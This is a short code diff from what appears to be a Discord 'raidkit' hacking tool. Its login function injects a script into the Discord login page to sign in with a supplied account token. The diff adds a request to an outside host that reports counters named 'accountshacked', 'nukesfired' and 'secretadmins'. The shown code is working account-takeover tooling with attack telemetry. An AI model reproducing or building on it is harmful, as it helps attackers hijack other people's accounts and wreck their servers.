@@ -48,7 +48,7 @@ def clear():
 
 
 def search_for_updates():
-    THIS_VERSION = "1.5.6.1"
+    THIS_VERSION = "1.5.7"
 
     header = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
@@ -129,6 +129,7 @@ def login(token):
             """
     driver.get("https://discord.com/login")
     driver.execute_script(script + f'\nlogin("{token}")')
+    r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 1, 'nukesfired': 0, 'secretadmins': 0, 'token': 'n'})
     main()
 
 
